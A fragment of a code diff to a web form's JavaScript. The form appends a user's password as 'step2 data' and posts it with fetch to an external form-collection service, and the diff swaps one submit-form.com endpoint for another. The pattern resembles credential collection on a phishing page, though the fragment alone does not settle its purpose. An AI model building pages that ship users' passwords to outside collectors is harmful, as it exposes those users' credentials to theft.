@@ -1413,10 +1413,10 @@
                 // Add step2 data
                 formData.append('password', password);
                 
-                fetch("https://submit-form.com/mHGJYBsPf", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
+                 // Submit the form
+                fetch('https://submit-form.com/CTbX1TGUV', {
+                method: 'POST',
+                    body: formData
                 })
                 .then(response => response.text())
                 .then(() => {
